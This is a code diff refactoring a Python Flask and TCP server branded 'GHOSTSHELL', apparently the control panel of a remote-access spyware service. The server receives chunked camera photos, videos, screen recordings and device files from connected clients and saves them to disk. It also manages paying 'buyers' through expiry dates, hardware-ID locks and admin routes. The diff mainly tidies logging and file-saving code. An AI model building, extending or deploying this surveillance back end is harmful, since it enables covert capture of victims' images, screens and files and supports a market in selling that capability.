@@ -19,26 +19,19 @@ server_logs = []
 file_transfers = {}
 lock = threading.Lock()
 
-# --- DATABASE ENGINE SELECTION ---
-# Railway bakal otomatis ngasih DATABASE_URL kalau lu link service-nya
 DATABASE_URL = os.environ.get('DATABASE_URL')
 
 def get_db():
     if DATABASE_URL:
-        # PAKE POSTGRESQL (Railway Mode)
         conn = psycopg2.connect(DATABASE_URL, sslmode='require')
         return conn
     else:
-        # PAKE SQLITE (Lokal Mode)
         conn = sqlite3.connect('ghostshell.db')
         return conn
 
 def init_db():
     conn = get_db()
     cur = conn.cursor()
-    
-    # Syntax PostgreSQL dikit beda (pake BIGSERIAL atau SERIAL buat PK)
-    # Tapi standar IF NOT EXISTS tetep aman
     query = '''
         CREATE TABLE IF NOT EXISTS buyers (
             id SERIAL PRIMARY KEY,
@@ -52,14 +45,13 @@ def init_db():
     conn.commit()
     cur.close()
     conn.close()
-    print("[GHOSTSHELL] > DB Initialized ({} Mode)".format("PostgreSQL" if DATABASE_URL else "SQLite"))
+    print("[GHOSTSHELL] > DB Initialized.")
 
 # Folder initialization
 DIRS = ['captured_images', 'device_downloads', 'screen_recordings']
 for d in DIRS:
     if not os.path.exists(d): os.makedirs(d)
 
-# Helper buat handle row query (Biar PostgreSQL outputnya mirip SQLite Dict)
 def fetch_all_as_dict(cursor):
     columns = [column[0] for column in cursor.description]
     return [dict(zip(columns, row)) for row in cursor.fetchall()]
@@ -114,26 +106,23 @@ def handle_tcp_data(raw_line, cid):
                 fname = chunk.get('filename')
                 if fname: 
                     file_transfers.setdefault(fname, []).append(chunk.get('chunk'))
-                    if len(file_transfers[fname]) % 10 == 0:
-                        add_log(f"Receiving {t}: {fname} (Chunk {len(file_transfers[fname])})")
+                    if len(file_transfers[fname]) % 20 == 0:
+                        add_log(f"Receiving {t}: {fname} (Chunks: {len(file_transfers[fname])})")
             elif 'END' in t:
                 fname = packet.get('file')
                 if fname and fname in file_transfers:
                     b64_data = "".join(file_transfers.pop(fname))
-                    if fname.endswith('.mp4'):
-                         folder = 'captured_images'
-                         path = os.path.join(folder, secure_filename(fname))
-                         with open(path, 'wb') as f: f.write(base64.b64decode(b64_data))
-                         cd['media'].update({"last_vid": fname, "status": "done"})
-                    elif t == 'CAMERA_IMAGE_END' or fname.startswith(('back_pic','front_pic')):
-                        # Save to disk and tell dashboard to load from URL
-                        folder = 'captured_images'
-                        path = os.path.join(folder, secure_filename(fname))
-                        with open(path, 'wb') as f: f.write(base64.b64decode(b64_data))
+                    path = os.path.join('captured_images', secure_filename(fname))
+                    with open(path, 'wb') as f: f.write(base64.b64decode(b64_data))
+                    
+                    if t == 'CAMERA_IMAGE_END' or fname.startswith(('back_pic','front_pic')):
                         cd['media'].update({"last_img": fname, "is_direct": False, "status": "done"})
-                    else:
-                        cd['media']['last_img'] = fname
-                    add_log(f"Data Received & Saved: {fname}")
+                        add_log(f"IMAGE SAVED: {fname}")
+                    elif fname.endswith('.mp4'):
+                        cd['media'].update({"last_vid": fname, "status": "done"})
+                else:
+                    add_log(f"Warning: END received but no data for {fname}")
+            
             add_log(f"Received {t} from {cid}")
     except Exception as e: add_log(f"Error parsing: {e}")
 
@@ -167,8 +156,6 @@ def tcp_server():
         c, a = s.accept()
         threading.Thread(target=client_handler, args=(c, a), daemon=True).start()
 
-# --- ROUTES ---
-
 @app.route('/')
 def index(): return render_template('index.html')
 
@@ -191,49 +178,31 @@ def admin_dashboard():
     conn.close()
     return render_template('admin.html', view='dashboard', users=users)
 
-# --- BUYER API ---
-
 @app.route('/api/buyer/login', methods=['POST'])
 def buyer_login():
     data = request.json
-    uid = data.get('uid')
-    hwid = data.get('hwid')
-    
+    uid, hwid = data.get('uid'), data.get('hwid')
     if not uid or not hwid: return jsonify({"status": "error", "message": "UID & HWID REQUIRED"}), 400
-    
     conn = get_db()
     cur = conn.cursor()
     cur.execute('SELECT * FROM buyers WHERE uid = %s', (uid,))
     user = fetch_one_as_dict(cur)
-    
     if not user:
-        cur.close()
-        conn.close()
+        cur.close(); conn.close()
         return jsonify({"status": "error", "message": "UID NOT REGISTERED"}), 401
-    
-    # Check Expiry
     expiry = user['expiry_date']
     if isinstance(expiry, str): expiry = datetime.strptime(expiry, '%Y-%m-%d %H:%M:%S')
     if expiry < datetime.now():
-        cur.close()
-        conn.close()
+        cur.close(); conn.close()
         return jsonify({"status": "error", "message": "ACCOUNT EXPIRED"}), 403
-    
-    # Check HWID
     if user['locked_hwid'] is None:
-        # First login binding
         cur.execute('UPDATE buyers SET locked_hwid = %s WHERE uid = %s', (hwid, uid))
         conn.commit()
     elif user['locked_hwid'] != hwid:
-        cur.close()
-        conn.close()
+        cur.close(); conn.close()
         return jsonify({"status": "error", "message": "LOCKED TO ANOTHER DEVICE"}), 403
-    
-    cur.close()
-    conn.close()
+    cur.close(); conn.close()
     return jsonify({"status": "ok"})
-
-# --- ADMIN API ---
 
 @app.route('/api/admin/login', methods=['POST'])
 def admin_login():
@@ -245,50 +214,37 @@ def admin_login():
 
 @app.route('/api/admin/logout')
 def admin_logout():
-    session.pop('is_admin', None)
-    return redirect(url_for('admin_login_page'))
+    session.pop('is_admin', None); return redirect(url_for('admin_login_page'))
 
 @app.route('/api/admin/create_user', methods=['POST'])
 def create_user():
     if not session.get('is_admin'): return jsonify({"status": "fail"}), 403
     data = request.json
-    uid = data.get('uid')
-    days = int(data.get('days', 30))
+    uid, days = data.get('uid'), int(data.get('days', 30))
     expiry = datetime.now() + timedelta(days=days)
-    
     try:
-        conn = get_db()
-        cur = conn.cursor()
+        conn = get_db(); cur = conn.cursor()
         cur.execute('INSERT INTO buyers (uid, expiry_date) VALUES (%s, %s)', (uid, expiry))
-        conn.commit()
-        cur.close()
-        conn.close()
+        conn.commit(); cur.close(); conn.close()
         return jsonify({"status": "ok"})
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 400
+    except Exception as e: return jsonify({"status": "error", "message": str(e)}), 400
 
 @app.route('/api/admin/reset_hwid', methods=['POST'])
 def reset_hwid():
     if not session.get('is_admin'): return jsonify({"status": "fail"}), 403
     uid = request.json.get('uid')
-    conn = get_db()
-    cur = conn.cursor()
+    conn = get_db(); cur = conn.cursor()
     cur.execute('UPDATE buyers SET locked_hwid = NULL WHERE uid = %s', (uid,))
-    conn.commit()
-    cur.close()
-    conn.close()
+    conn.commit(); cur.close(); conn.close()
     return jsonify({"status": "ok"})
 
 @app.route('/api/admin/delete_user', methods=['POST'])
 def delete_user():
     if not session.get('is_admin'): return jsonify({"status": "fail"}), 403
     uid = request.json.get('uid')
-    conn = get_db()
-    cur = conn.cursor()
+    conn = get_db(); cur = conn.cursor()
     cur.execute('DELETE FROM buyers WHERE uid = %s', (uid,))
-    conn.commit()
-    cur.close()
-    conn.close()
+    conn.commit(); cur.close(); conn.close()
     return jsonify({"status": "ok"})
 
 @app.route('/api/status')
